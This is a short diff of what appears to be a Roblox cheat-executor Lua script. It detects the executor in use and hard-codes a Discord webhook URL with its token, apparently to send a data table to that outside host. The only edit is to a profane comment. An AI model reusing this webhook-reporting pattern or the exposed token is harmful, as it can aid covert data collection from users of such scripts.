@@ -6,7 +6,7 @@ local webhookcheck =
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "trash exploit here"
---dumb fucker kept deleting my webhook
+--dumb fucker kept deleting my webhooks
 local url =
    "https://discord.com/api/webhooks/925075327754059826/EvROnNwvfVRAfw2BD8CVgbSe5hMZNvad7isFzd13fZPiJsHZYlGiQJQ5goIUnjobkQC-"
 local data = {
